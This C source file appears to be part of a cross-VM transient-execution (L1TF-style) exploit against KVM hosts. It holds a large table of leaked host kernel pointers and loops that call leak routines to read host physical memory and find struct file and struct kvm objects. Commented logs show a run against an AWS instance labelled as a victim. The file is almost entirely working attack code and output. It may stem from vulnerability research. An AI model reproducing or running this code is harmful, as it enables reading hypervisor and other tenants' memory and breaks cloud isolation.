		0xffff934f4961a600,
		0xffff934f4961a800,
		0xffff934f4961a200,
		0xffff934f4961ad00,
		0xffff934f4961aa00,
		0xffff934f4961af00,
		0xffff934f4961a900,
		0xffff934f4961a100,
		0xffff9343dfc7af00,
		0xffff9343dfc7a900,
		0xffff9343dfc7a000,
		0xffff9343dfc7a300,
		0xffff9343dfc7a700,
		0xffff934f4961a300,
		0xffff934f4961a400,
		0xffff934f4961ab00,
		0xffff934f4961ae00,
		0xffff934f4961a700,
		0xffff934f4961ac00,
		0xffff9341b74c2b00,
		0xffff9341531f6300,
		0xffff9341531f6700,
		0xffff9341531f6600,
		0xffff9341531f6b00,
		0xffff9341531f6f00,
		0xffff9341531f6900,
		0xffff93418ffc0600,
		0xffff934159e51500,
		0xffff934159e51000,
		0xffff934159e51100,
		0xffff934159e51f00,
		0xffff9348e6ca2e00,
		0xffff9348e6ca2400,
		0xffff9348e6ca2600,
		0xffff9348e6ca2000,
		0xffff9348e6ca2200,
		0xffff9348e6ca2900,
		0xffff9348e6ca2f00,
		0xffff9348e6ca2500,
		0xffff9348e6ca2c00,
		0xffff934152292300,
		0xffff9342185b6d00,
		0xffff9342185b6600,
		0xffff9350672c1200,
		0xffff93416d818f00,
		0xffff9341733e5800,
		0xffff9350672c1b00,
		0xffff9350672c1d00,
		0xffff9350672c1a00,
		0xffff9350672c1100,
		0xffff9341b74a9200,
		0xffff9341b74a9c00,
		0xffff9341b74a9400,
		0xffff9350672c1700,
		0xffff9350672c1400,
		0xffff934297efed00,
		0xffff934151c63400,
		0xffff9341b74a9700,
		0xffff9344c93cbb00,
		0xffff9341a042b000,
		0xffff9342d04f8c00,
		0xffff9341733e5600,
		0xffff93416d818800,
		0xffff93416d818e00,
		0xffff934153670800,
		0xffff93a1c82f4100,
		0xffff934151c63b00,
		0xffff9341570d9100,
		0xffff934153676700,
		0xffff934151c63500,
		0xffff9342185b6000,
		0xffff93415724bb00,
		0xffff9342bf180000,
		0xffff934151c63600,
		0xffff934151c63c00,
		0xffff93a172c72e00,
		0xffff93a057da8e00,
		0xffff93414ee9ee00,
		0xffff9348e6dd1400,
		0xffff93417feacc00,
		0xffff934264cc1d00,
		0xffff93414ec5c000,
		0xffff936a91c5ed00,
		0xffff9341a042bc00,
		0xffff9341a042b900,
		0xffff934215403700,
		0xffff934215403200,
		0xffff934215403e00,
		0xffff934215403400,
		0xffff934215403800,
		0xffff9341573a3300,
		0xffff9341573a3400,
		0xffff9341573a3d00,
		0xffff934153676a00,
		0xffff9341802c0000,
		0xffff9341802c7b00,
		0xffff934294077f00,
		0xffff9341802c7c00,
		0xffff9341802c7700,
		0xffff9341802c7600,
		0xffff934294002b00,
		0xffff93415286f400,
		0xffff934154570100,
		0xffff934294077400,
		0xffff9341571b3e00,
		0xffff934151c67100,
		0xffff9341802c7400,
		0xffff934154570a00,
		0xffff93420f37ce00,
		0xffff93415413f800,
		0xffff93415413f300,
		0xffff934165dc9d00,
		0xffff934165dc9b00,
		0xffff93420f37cd00,
		0xffff93415454a400,
		0xffff934154702e00,
		0xffff934153676600,
		0xffff934154113900,
		0xffff934153676800,
		0xffff934153676d00,
		0xffff93a52914f300,
		0xffff93a09590a900,
		0xffff9341571c0a00,
		0xffff935dd8333500,
		0xffff9341571c0200,
		0xffff93a154a22700,
		0xffff934153676200,
		0xffff934153676400,
		0xffff934153676300,
		0xffff934153676b00,
		0xffff934151c63900,
		0xffff934151c63100,
		0xffff934151c63700,
		0xffff9342185b6b00,
		0xffff9342185b6200,
		0xffff934151c63000,
		0xffff934154151d00,
		0xffff934154151900,
		0xffff934154151500,
		0xffff934154151800,
		0xffff934154151e00,
		0xffff934154151a00,
		0xffff9341573a0700,
		0xffff9341573a0c00,
		0xffff934154151300,
		0xffff9348e6dd1300,
		0xffff934153290000,
		0xffff93416cc43600,
		0xffff93415329a000,
		0xffff93415329a800,
		0xffff93415329a700,
		0xffff93415329a300,
		0xffff93416ae5c700,
		0xffff93416ae5cc00,
		0xffff93416ae5c000,
		0xffff93416ae5c400,
		0xffff93414ee49a00,
		0xffff93427072e300,
		0xffff934157241a00,
		0xffff934157241900,
		0xffff934157241e00,
		0xffff934157241700,
		0xffff934157241b00,
		0xffff934157241200,
		0xffff9341573f8900,
		0xffff9341573f8700,
		0xffff9341573f8200,
		0xffff93a08df03400,
		0xffff934218515a00,
		0xffff93414cfc1c00,
		0xffff93421541b000,
		0xffff936fc9aee200,
		0xffff93417f066c00,
		0xffff936fc9aee300,
		0xffff9341573f4000,
		0xffff9341573f4300,
		0xffff9341573f4b00,
		0xffff9341573f4d00,
		0xffff93416d818300,
		0xffff93416d818000,
		0xffff93416d818900,
		0xffff935284f2d400,
		0xffff93415414b500,
		0xffff9341a7d97b00,
		0xffff934151d1c000,
		0xffff934165f15400,
		0xffff934151c62000,
		0xffff9342fbf3a000,
		0xffff93424f7cfc00,
		0xffff9342fbf3aa00,
		0xffff934152537600,
		0xffff934286d20600,
		0xffff93428a044500,
		0xffff934287f6df00,
		0xffff93428a844a00,
		0xffff9341a0434000,
		0xffff9341ed032600,
		0xffff934151c61b00,
		0xffff934175c8d700,
		0xffff936d51bcdd00,
		0xffff936d51bcde00,
		0xffff936d51bcd200,
		0xffff93421541b400,
		0xffff93416e75a900,
		0xffff9341731ce400,
		0xffff930090225000,
		0xffff934154752100,
		0xffff934154752400,
		0xffff934154752f00,
		0xffff934154752900,
		0xffff934154752000,
		0xffff934154752e00,
		0xffff934154752c00,
		0xffff934154578000,
		0xffff934152613b00,
		0xffff9348e6dd1f00,
		0xffff93416ae5c100,
		0xffff934151c61600,
		0xffff934296368d00,
		0xffff934159b75b00,
		0xffff934151da0300,
		0xffff93a1066de800,
		0xffff93415414b100,
		0xffff9341a042e400,
		0xffff9341533e5200,
		0xffff9341533e5400,
		0xffff93607d474300,
		0xffff936b7d474900,
		0xffff936b7d474c00,
		0xffff936b7d474400,
		0xffff936b7d474700,
		0xffff936b7d474e00,
		0xffff936b7d474600,
		0xffff936b7d474800,
		0xffff9348e58b1c00,
		0xffff934296368600,
		0xffff9341802e9800,
		0xffff9341540ead00,
		0xffff9341540eaf00,
		0xffff9341540ea400,
		0xffff9341540ea700,
		0xffff93414ee9e100,
		0xffff93421541b600,
		0xffff9348e58b1200,
		0xffff934215707100,
		0xffff934153670600,
		0xffff9348e58b0800,
		0xffff93a3881b6300,
		0xffff93a132be1300,
		0xffff934151c61000,
		0xffff9341733e5e00,
		0xffff93f664db1e00,
		0xffff934151c61c00,
		0xffff93417fce5200,
		0xffff93a09be30a00,
		0xffff934162615800,
		0xffff936a91c5e300,
		0xffff937a4a33d600,
		0xffff93a1cb0cf200,
		0xffff93a09c4e5a00,
		0xffff93dbcab12f00,
		0xffff93418ff79600,
		0xffff9342962aa400,
		0xffff9341573a3e00,
		0xffff9348e5c2c300,
		0xffff934154635f00,
		0xffff934151da0900,
		0xffff934144579700,
		0xffff93a159dc9400,
		0xffff93415e2f3700,
		0xffff93a163d3a300,
		0xffff93f151127b00,
		0xffff9341570d9c00,
		0xffff9341570d9300,
		0xffff9341570d9800,
		0xffff9341e2268200,
		0xffff9350ce9cee00,
		0xffff93b388144500,
		0xffff93414ee32500,
		0xffff93425e151a00,
		0xffff93414cfc1000,
		0xffff934218429400,
		0xffff934163f1f700,
		0xffff93a156824b00,
		0xffff93a196756100,
		0xffff93a144b44800,
		0xffff93417febff00,
		0xffff93415a260c00,
		0xffff93417443dd00,
		0xffff93415a260100,
		0xffff93415a260500,
		0xffff9341b74a9b00,
		0xffff9341b74a9f00,
		0xffff9341b74a9800,
		0xffff934153670f00,
		0xffff934153670500,
		0xffff934153670900,
		0xffff93416560a500,
		0xffff9341656da300,
		0xffff9341656dae00,
		0xffff9341656daa00,
		0xffff9341656da800,
		0xffff9341656dab00,
		0xffff9341656da700,
		0xffff9341656dac00,
		0xffff9341656da600,
		0xffff9341656daf00,
		0xffff934159423200,
		0xffff93a19bc81300,
		0xffff93a1dc22c600,
		0xffff93a1834bfe00,
		0xffff93a0fc7aad00,
		0xffff936156ea6f00,
		0xffff93a0984a5000,
		0xffff9353451e4400,
		0xffff93a19b9c2200,
		0xffff934152070900,
		0xffff934152553e00,
		0xffff934175c8d800,
		0xffff934175c8dc00,
		0xffff93414ee31d00,
		0xffff93a166f6fe00,
		0xffff93a1724a2100,
		0xffff93a196114300,
		0xffff93a156e96b00,
		0xffff9341ef756300,
		0xffff9341fe3a4100,
		0xffff93bb1d234200,
		0xffff93aa4a166a00,
		0xffff93debcda4500,
		0xffff93ba7d4a6000,
		0xffff93a1cb0a7d00,
		0xffff93a15126cf00,
		0xffff93a71fc2f700,
		0xffff9341f2eefb00,
		0xffff934159f4ad00,
		0xffff93a092061500,
		0xffff93ad2a162700,
		0xffff93429400dd00,
		0xffff93429400de00,
		0xffff93429400da00,
		0xffff93429400db00,
		0xffff93429400d700,
		0xffff9341520c0000,
		0xffff9341e2204200,
		0xffff9341e2204100,
		0xffff9341520c0700,
		0xffff934178133100,
		0xffff9341520c0900,
		0xffff934154129900,
		0xffff934154137900,
		0xffff9341520c0200,
		0xffff9341520c0100,
		0xffff93a162fadb00,
		0xffff9342704ef200,
		0xffff9341571c0d00,
		0xffff934159a6f500,
		0xffff934159a6f900,
		0xffff934159a6fb00,
		0xffff934159a6f000,
		0xffff934159a6f700,
		0xffff934159a6f100,
		0xffff9341a7d97f00,
		0xffff9341a7d97c00,
		0xffff93421840b800,
		0xffff93a0980bb600,
		0xffff934284a63200,
		0xffff93a1960cce00,
		0xffff9341571c0000,
		0xffff9341571c0b00,
		0xffff9342704efb00,
		0xffff9342704ef700,
		0xffff9342704ef900,
		0xffff9342704ef600,
		0xffff9342704eff00,
		0xffff9342704efd00,
		0xffff9342704ef300,
		0xffff9342704ef100,
		0xffff9341534bdc00,
		0xffff93415739c700,
		0xffff9341534bd200,
		0xffff9341534bdb00,
		0xffff9341534bd000,
		0xffff9341534bd400,
		0xffff9341534bde00,
		0xffff9341534bd900,
		0xffff9341534bd100,
		0xffff9341534bd600,
		0xffff9341534bdf00,
		0xffff9341534bda00,
		0xffff9341534bd800,
		0xffff934218515c00,
		0xffff9341a0433400,
		0xffff9341a0433a00,
		0xffff9341a0433100,
		0xffff9341a0433b00,
		0xffff9341a0433000,
		0xffff9341a0433700,
		0xffff9341a0433f00,
		0xffff9341a0433e00,
		0xffff934157246800,
		0xffff9343a7513300,
		0xffff9343a7513000,
		0xffff9343a7513500,
		0xffff93ad20671a00,
		0xffff934157246b00,
		0xffff934157246a00,
		0xffff93415b3eb200,
		0xffff934157246e00,
		0xffff934157240000,
		0xffff934157246000,
		0xffff934157246b00,
		0xffff934157246f00,
		0xffff934157246300,
		0xffff934157246400,
		0xffff9341540e3c00,
		0xffff934286120700,
		0xffff934150246a00,
		0xffff934286120900,
		0xffff934286120300,
		0xffff934286120600,
		0xffff934286120e00,
		0xffff93a0935a7f00,
		0xffff9341617aee00,
		0xffff93504530e300,
		0xffff93504530ea00,
		0xffff9341519e7200,
		0xffff9341731ce000,
		0xffff9342831e5e00,
		0xffff9341a042e000,
		0xffff934270777a00,
		0xffff9341a042e300,
		0xffff9341a042eb00,
		0xffff9341a042e700,
		0xffff9341a042ed00,
		0xffff9341d2827400,
		0xffff93bce349d600,
		0xffff93a17231a300,
		0xffff934286120f00,
		0xffff93c6084b0900,
		0xffff93c6598aaf00,
		0xffff93a157125300,
		0xffff934286120b00,
		0xffff9341571c0400,
		0xffff9342704efc00,
		0xffff9342704ef500,
		0xffff9342704ef800,
		0xffff93a12a679200,
		0xffff934253351100,
		0xffff9370dd749300,
		0xffff93a146933100,
		0xffff9350708eb100,
		0xffff93a1d2362a00,
		0xffff934132521f00,
		0xffff93a159d9ff00,
		0xffff93a15724aa00,
		0xffff9342704efa00,
		0xffff9342704ef000,
		0xffff93421840b600,
		0xffff934163b2a500,
		0xffff934163b2ad00,
		0xffff934163b2ae00,
		0xffff934163b2a700,
		0xffff934163b2ab00,
		0xffff934163b2a800,
		0xffff934297eaa000,
		0xffff934283260600,
		0xffff93415983e600,
		0xffff93415983e100,
		0xffff93429407b300,
		0xffff9341573ac200,
		0xffff9341573ac300,
		0xffff9341573ac700,
		0xffff9341573ac900,
		0xffff9341573ace00,
		0xffff9341573acb00,
		0xffff93415983e200,
		0xffff93415983ef00,
		0xffff9343d1105c00,
		0xffff9343d1105900,
		0xffff9343d1105800,
		0xffff9343d1105100,
		0xffff93422869ce00,
		0xffff93422869c000,
		0xffff93422869cb00,
		0xffff93422869c900,
		0xffff93422869cf00,
		0xffff9341538aaa00,
		0xffff934157073c00,
		0xffff93415983e500,
		0xffff93414e318800,
		0xffff93414e318900,
		0xffff93415983e700,
		0xffff9341507f4200,
		0xffff9341507f4c00,
		0xffff934283033700,
		0xffff934283033200,
		0xffff934283033900,
		0xffff934283033600,
		0xffff9341a0434f00,
		0xffff9341a0434600,
		0xffff9348e6a20200,
		0xffff934152537c00,
		0xffff93416e402a00,
		0xffff9342849d9a00,
		0xffff9341572f5000,
		0xffff9341073a2600,
		0xffff93415474ad00,
		0xffff93415474a500,
		0xffff9342849ddc00,
		0xffff93427675ab00,
		0xffff9342860ff600,
		0xffff93414e318400,
		0xffff93414e312800,
		0xffff9341802e9100,
		0xffff934211b5eb00,
		0xffff934211b5e600,
		0xffff936e0a535d00,
		0xffff9341571b3300,
		0xffff934286cffc00,
		0xffff934286cff700,
		0xffff93a1d284b600,
		0xffff934286cff200,
		0xffff934286cffa00,
		0xffff934286cff400,
		0xffff934286cff500,
		0xffff934286cffb00,
		0xffff934286cff300,
		0xffff934286cffd00,
		0xffff93416d2c5e00,
		0xffff93416d2c5500,
		0xffff93416d2c5b00,
		0xffff93416d2c5c00,
		0xffff93416d2c5300,
		0xffff93416d2c5200,
		0xffff93416d2c5800,
		0xffff93416d2c5a00,
		0xffff93416d2c5400,
		0xffff93a146ec2200,
		0xffff93416d2c5900,
		0xffff93416d2c5f00,
		0xffff93416d2c5100,
		0xffff93416d2c5000,
		0xffff9341540e6e00,
		0xffff934151ac0900,
		0xffff93428be77400,
		0xffff934159892200,
		0xffff93b9bace0000,
		0xffff93a142943200,
		0xffff93427674f200,
		0xffff93a0e8aaf400,
		0xffff9341544c5600,
		0xffff93415367f700,
		0xffff93415412bf00,
		0xffff93415412b700,
		0xffff93415412b800,
		0xffff93415412b000,
		0xffff93415412ba00,
		0xffff934154139b00,
		0xffff934154139100,
		0xffff934154139d00,
		0xffff934154139900,
		0xffff934154139e00,
		0xffff934154139500,
		0xffff934154139000,
		0xffff934154139300,
		0xffff934154139a00,
		0xffff9370ee39db00,
		0xffff9370ee39df00,
		0xffff9370ee39d200,
		0xffff9370ee39d900,
		0xffff9370ee39d800,
		0xffff9370ee39d700,
		0xffff9370ee39d300,
		0xffff9370ee39d600,
		0xffff93416e4fff00,
		0xffff93416e4ffc00,
		0xffff93416e4ff800,
		0xffff934157167700,
		0xffff9341fc30cb00,
		0xffff9341b74a9000,
		0xffff93415f9fcf00,
		0xffff93444af2d300,
		0xffff93444af2d700,
		0xffff93444af2db00,
		0xffff934151c64900,
		0xffff93444af2de00,
		0xffff93414ee42600,
		0xffff93414ee42900,
		0xffff9341802c7000,
		0xffff934180207100,
		0xffff9341802c7500,
		0xffff93417233b700,
		0xffff93415329a500,
		0xffff934276577300,
		0xffff934151c66c00,
		0xffff934151c64f00,
		0xffff934151c66700,
		0xffff934151c64400,
		0xffff934151c64000,
		0xffff934151c64500,
		0xffff934151c64a00,
		0xffff93428d87e600,
		0xffff93428d87ec00,
		0xffff93428d87eb00,
		0xffff93428d87e900,
		0xffff9341573a8800,
		0xffff9341573a8500,
		0xffff9341544c5a00,
		0xffff9341544c5700,
		0xffff9341544c5800,
		0xffff9341544c5900,
		0xffff9341544c5200,
		0xffff9341544c5400,
		0xffff9341544c5c00,
		0xffff9341544c5e00,
		0xffff9341544c5100,
		0xffff9341544c5300,
		0xffff934153931500,
		0xffff934153931700,
		0xffff934153931400,
		0xffff9343d1105600,
		0xffff9343d1105300,
		0xffff9343d1105400,
		0xffff934153931900,
		0xffff934153931d00,
		0xffff9343d1105b00,
		0xffff9343d1105f00,
		0xffff934153931f00,
		0xffff9342287ba200,
		0xffff9342287ba900,
		0xffff93a197c6c200,
		0xffff93a197c6c700,
		0xffff9342287ba100,
		0xffff9348e5d4b200,
		0xffff93a197c6c300,
		0xffff93a197c6cf00,
		0xffff9348e5d4be00,
		0xffff93a197c6c900,
		0xffff9348e5d4b000,
		0xffff93a197c6cb00,
		0xffff9348e5d4ba00,
		0xffff93a197c6c600,
		0xffff93a10b8afd00,
		0xffff9348e5d4b400,
		0xffff9341b749c900,
		0xffff9341b749cb00,
		0xffff9341b749c000,
		0xffff9341b749cf00,
		0xffff9341b749c300,
		0xffff9341b749cd00,
		0xffff9341b749c500,
		0xffff9341b749c600,
		0xffff9341b749c800,
		0xffff9341b749ca00,
		0xffff9341b749ce00,
		0xffff9341b749c700,
		0xffff9341b700cc00,
		0xffff9341b749c200,
		0xffff93418fef3300,
		0xffff93418fef3e00,
		0xffff93418fef3b00,
		0xffff93418fef3100,
		0xffff93418fef3000,
		0xffff93416cd30a00,
		0xffff93418fef3f00,
		0xffff93a794046100,
		0xffff93418fef3d00,
		0xffff93418fef3400,
		0xffff934218548d00,
		0xffff93a094f72b00,
		0xffff934218548000,
		0xffff934218548e00,
		0xffff934228525b00,
		0xffff9343a7462e00,
		0xffff9343a7462f00,
		0xffff9343a7462900,
		0xffff9343a7462000,
		0xffff9343a7462700,
		0xffff9343a7462200,
		0xffff9342287e5800,
		0xffff9342287e5e00,
		0xffff9342287e5600,
		0xffff9342287e5b00,
		0xffff9342287e5000,
		0xffff9342287e5400,
		0xffff9342287e5100,
		0xffff9342287e5200,
		0xffff9342287e5d00,
		0xffff9342287e5900,
		0xffff934154726000,
		0xffff9342287e5300,
		0xffff934154726400,
		0xffff934154726200,
		0xffff934154726c00,
		0xffff934154726500,
		0xffff934154726800,
		0xffff934154726f00,
		0xffff934154128900,
		0xffff934154128500,
		0xffff934154128000,
		0xffff934154128600,
		0xffff934154128800,
		0xffff934154128b00,
		0xffff934154128c00,
		0xffff934154128f00,
		0xffff934122242900,
		0xffff93a117147500,
		0xffff93a1c53d5c00,
		0xffff93df9eea6500,
		0xffff93ca4a4d4100,
		0xffff9341c1462100,
		0xffff93a1c5515300,
		0xffff934218548900,
		0xffff934218548800,
		0xffff934154124200,
		0xffff93a115a19e00,
		0xffff935153724600,
		0xffff934144143800,
		0xffff93a1a4d93a00,
		0xffff934471952200,
		0xffff93a142a31100,
		0xffff93a1cb140b00,
		0xffff93449d233700,
		0xffff934159af8a00,
		0xffff93c620afb800,
		0xffff93a146517300,
		0xffff93a166f6f400,
		0xffff934218548400,
		0xffff934218548b00,
		0xffff934218548600,
		0xffff934218548700,
		0xffff934218548f00,
		0xffff934218548c00,
		0xffff934214b2e200,
		0xffff934214b2ea00,
		0xffff9343a7752600,
		0xffff934214b2e400,
		0xffff93a14487ee00,
		0xffff934214b2e900,
		0xffff93a146162b00,
		0xffff93c659892500,
		0xffff93a192342a00,
		0xffff9340b0305700,
		0xffff93424c17c900,
		0xffff9341e2202000,
		0xffff93415367b100,
		0xffff93415367bc00,
		0xffff93420f035300,
		0xffff93415367bd00,
		0xffff934154124000,
		0xffff93a1a2d33500,
		0xffff934283260300,
		0xffff93429407b000,
		0xffff934294070000,
		0xffff9341802bf200,
		0xffff9341802bfe00,
		0xffff9341802bfc00,
		0xffff934283260c00,
		0xffff934283260200,
		0xffff934283260400,
		0xffff934283260900,
		0xffff934283260f00,
		0xffff934283260800,
		0xffff934283260a00,
		0xffff934283260e00,
		0xffff934283260100,
		0xffff934283260700,
		0xffff93414e30f500,
		0xffff934170d7a900,
		0xffff93421844d300,
		0xffff93414cfc3900,
		0xffff93414cfc3d00,
		0xffff9341519e8c00,
		0xffff9341519e8100,
		0xffff9341519e8300,
		0xffff93415199e900,
		0xffff9341547b2800,
		0xffff9341573a1100,
		0xffff9341540e1100,
		0xffff934294002700,
		0xffff9341137cfc00,
		0xffff93a0e8b87c00,
		0xffff934152613900,
		0xffff9341572f5f00,
		0xffff93418fff2000,
		0xffff934154152d00,
		0xffff93418fff2900,
		0xffff93418fff2400,
		0xffff934154152500,
		0xffff93410260be00,
		0xffff93415261b400,
		0xffff93415261b700,
		0xffff93415261b900,
		0xffff93415261b500,
		0xffff93415261bc00,
		0xffff93415261b300,
		0xffff93415261bd00,
		0xffff93415261b600,
		0xffff93415261b100,
		0xffff93415261bf00,
		0xffff9341572fbd00,
		0xffff9341572fb100,
		0xffff93420f0e1c00,
		0xffff93420f0e1000,
		0xffff93416e4ff200,
		0xffff934283033000,
		0xffff93420f0e1b00,
		0xffff934152613300,
		0xffff93505afff800,
		0xffff93418fff3900,
		0xffff9341e2231400,
		0xffff9341573f6500,
		0xffff93505afff400,
		0xffff93420f0e1700,
		0xffff93420f0e1f00,
		0xffff9341573ae500,
		0xffff934112411300,
		0xffff93c2445d7300,
		0xffff934197e8db00,
		0xffff934217261700,
		0xffff9341547b6900,
		0xffff93a0912e7000,
		0xffff93a0a40be600,
		0xffff934149511700,
		0xffff9341114a6600,
		0xffff93a0935a7e00,
		0xffff93a11e9d3600,
		0xffff93a0917dc600,
		0xffff93a1341e8400,
		0xffff93a172010900,
		0xffff934144b44300,
		0xffff93a172276100,
		0xffff934164152400,
		0xffff934214b2e800,
		0xffff93416dd26100,
		0xffff93a1dce73000,
		0xffff93a0917dcb00,
		0xffff93a194d3bf00,
		0xffff93415983e400,
		0xffff9350ceb1f200,
		0xffff9350ceb1f500,
		0xffff93a13250cb00,
		0xffff93a100a16700,
		0xffff93a1cef77300,
		0xffff9342fbafb400,
		0xffff93a0935a7500,
		0xffff93a13250cc00,
		0xffff93a196799300,
		0xffff9342fbafb200,
		0xffff93a140341700,
		0xffff934171518400,
		0xffff93a045542900,
		0xffff93a1d2f70200,
		0xffff93a1325d9b00,
		0xffff9341ec214400,
		0xffff93417933b300,
		0xffff9341573a3200,
		0xffff93a11562a100,
		0xffff93a1962a1f00,
		0xffff93a1d2119b00,
		0xffff9370dd749500,
		0xffff9352a42fb400,
		0xffff93a1c7e3c200,
		0xffff93a1cef72e00,
		0xffff93418ffe6100,
		0xffff93a192212600,
		0xffff93414ee75d00,
		0xffff93a168669800,
		0xffff93c325af8600,
		0xffff934129e64400,
		0xffff93419415d900,
		0xffff93413316b500,
		0xffff9341574f9800,
		0xffff93a1444b6500,
		0xffff93a1c02f3700,
		0xffff934243438400,
		0xffff93428bf61100,
		0xffff93a153844b00,
		0xffff93a0e8bbd400,
		0xffff93ba7d779400,
		0xffff936fbca18000,
		0xffff930020c0a800,
		0xffff93a142a5b100,
		0xffff93a1caabb000,
		0xffff93415739ea00,
		0xffff93a195528400,
		0xffff93a100e42100,
		0xffff93a100df0000,
		0xffff93a000140600,
		0xffff9341099d8e00,
		0xffff934286cf4800,
		0xffff93509700b300,
		0xffff34419446c300,
		0xffff93a190d7be00,
		0xffff934150f4a100,
		0xffff93421662a700,
		0xffff93415e77a100,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0xffff93a08df03200,
		0x0,
		0xffff9342d9059b00,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
	};
	
	// for (u64 i = 0; i < sizeof(fileps)/sizeof(hva_t); i++) {
	// 	pr_dub("%16lx = file[%3lx] %s\n", fileps[i], i, in_direct_map(fileps[i], hdm) ? "" : "<-- incomplete");
	// }

	int max_fdi = 1;
	while (1) {
		max_fdi = 2*max_fdi > 0x400 ? 0x400 : 2*max_fdi;
		pr_dub("max_fdi = %d\n", max_fdi);
		for (int fdi = 0; fdi < max_fdi; fdi++) {
			u64 filep = fileps[fdi];
			if (!in_direct_map(filep, hdm))
				continue;

			uint16_t high;
			for (unsigned long j = 0; j < sizeof(cand_priv_offs)/sizeof(int); j++) {
				int off = cand_priv_offs[j];
				leak(&high, base, filep-hdm+off+5, 2);
				pr_dub("file[%3x] = %16lx  --> +%02x +5 = %04hx\n", fdi, filep, off, high);
			}
		}
		pr_dub("\n\n");
	}

	while (1) {
		for (int fdi = 0x400-1; fdi >= 0; fdi--) {
			u64 filep = fileps[fdi];
			if (!in_direct_map(filep, hdm))
				continue;
			pr_dub("file[%3x] = %16lx in direct map\n", fdi, filep);
			
			// hpa_t end = filep-hdm+0x100;
			// hpa_t start = filep-hdm+6;
			// do {
			// 	start = l1tf_find_magic16(base, 0xffff, start, end, 8, 10000);
			// 	if (start < end)
			// 		pr_dub("file[%3x] = %16lx  --> +%lx = ffff\n", fdi, filep, start-(filep-hdm+6));
			// } while (start < end);

			uint16_t high;
			for (int off = 0; off < 0x100; off += 0x8) {
				leak(&high, base, filep-hdm+off+6, 2);
				pr_dub("file[%3x] = %16lx  --> +%2x +6 = %hx\n", fdi, filep, off, high);
			}

		}
	}

	while (1) {
		for (int fdi = 0x00; fdi < 0x400; fdi++) {
			// dump((u64)fdi);
			int off = fdi * 8;
			u64 filep = leak64(base, fd_cand-hdm+off);
			filep &= ~7UL;
			dump(filep);
			if (!in_direct_map(filep, hdm))
				continue;

			for (unsigned long j = 0; j < sizeof(cand_priv_offs)/sizeof(int); j++) {
				dump((u64)cand_priv_offs[j]);
				uint8_t x;
				leak(&x, base, filep-hdm+cand_priv_offs[j]+5, 1);
				dump((u64)x);
				if ((uint8_t)0x94 <= x && x <= (uint8_t)0xb3) {
					u64 priv = leak64(base, filep-hdm+cand_priv_offs[j]);
					dump(priv);
					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
					dump(priv);
					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
					dump(priv);
					pr_dub("opgelet! iets gevonden :)\n");
					pr_dub("fd[0x%x] = %16lx, -->+%x = %16lx    (note: kvm=%lx)\n", fdi, filep, cand_priv_offs[j], priv, OWN_KVM);
				}	 
			}
		}
	}

	exit(0);


	// hva_t fd_data[0x30];
	// leak(fd_data, base, fd-hdm, sizeof(fd_data));
	// display(fd_data, sizeof(fd_data));
	// hva_t fd_data[0x30] = {
	// 	0xffff93e3c6600800,
	// 	0xffff93e3c6600800,
	//	...
	// };

	// For all candidate private_data offsets (0xc0 and 0xe8 below), try to
	// find a vmalloc-ed pointer: candidate for our `struct kvm`.
	// for (int i = 0; i < 0x30; i++) {
	// 	dump(i);
	// 	dump(fd_data[i]);
	// 	reverse_after(base, fd_data[i]-hdm+0xc0, hdm, "fd_data[i]+0xc0", 0x8);
	// 	reverse_after(base, fd_data[i]-hdm+0xe8, hdm, "fd_data[i]+0xe8", 0x8);
	// }
	// FOUND: at fd[9]+0xc0, we see our own kvm pointer.

	hva_t kvm_candidate = 0xffff93e45b1974c0; // at fd[9] + 0xc0
	dump(leak64(base, kvm_candidate-hdm));
	dump(OWN_KVM);
}

void reverse_aws_struct_kvm(void)
{
/* rain-vm-aws-c5-victim


	void try_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, const size_t length)
	{
	assert(0 < length && length <= 64 && (phys_addr & (64-1)) + length <= 64);

		// half_spectre_start(base, phys_addr);
		half_spectre_start(base, 0x17a101fa8000 + (phys_addr-0x9e092000));

	========[CONFIG]========
MACHINE:         AWS (2)
HELPERS:          NO (0)
LEAK:           SKIP (1)
========================


host_direct_map(base=9e39e218)
--------------------------------------------------------------------------------

own_vcpu(base=9e39e218, hdm=ffff9868c0000000)
--------------------------------------------------------------------------------

own_task(base=9e39e218, hdm=ffff9868c0000000, vcpu=ffff98695f2137c0)
--------------------------------------------------------------------------------

host_cr3(base=9e39e218, hdm=ffff9868c0000000, task=ffff98695f1eb2a0)
--------------------------------------------------------------------------------

host_walk_tasks(base=9e39e218, hdm=ffff9868c0000000, hcr3=9e154000, task_first=ffff98695f1eb2a0)
--------------------------------------------------------------------------------

vcpu_via_fds(base=9e39e218, hdm=ffff9868c0000000, task=ffff987b61afb2a0)
--------------------------------------------------------------------------------

	 * On rain-vm-aws-c5-victim:
	 * struct kvm * to victim's kvm struct:
	 * hva ffffb009c1fa8000 --> pgd    1000067 pud    10b2067 pmd   ac9ca067 pte   9e092063 pa   9e092000

	reverse_after(base, 0x9e092000, 0, "struct kvm", 0x80);

	0x9e39e218UL =         9e39e218
	dm         9e092000 | pa     9e092000 |       struct kvm+   0 =                0
	dm         9e092008 | pa     9e092008 |       struct kvm+   8 =                0
	dm         9e092010 | pa     9e092010 |       struct kvm+  10 =                0
